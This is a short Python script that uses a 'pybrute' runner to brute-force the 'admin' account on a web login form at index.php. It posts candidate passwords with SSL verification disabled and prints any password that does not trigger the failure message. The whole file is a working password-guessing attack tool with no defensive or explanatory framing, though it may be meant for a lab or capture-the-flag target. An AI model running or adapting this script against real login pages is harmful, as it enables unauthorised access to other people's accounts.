from pybrute.runner import Runner
from pybrute.config import URL
import asyncio


result = []
async def main(session, password, results):
    password = password.strip()
    if not password:
        return None
    url = f"{URL}/index.php"
    form_data = {"name": "admin", "pwd": password}

    async with session.post(url, data=form_data, ssl=False) as response:
        resp = await response.text()
        if "Username or password is incorrect" not in resp:
            print(f"[+] Found password: {password}")
            # if you want to stop the script after finding one password, return True
            results.append(password)
            return True

    return None

run = Runner(main, result)
asyncio.run(run.run())

print(result)
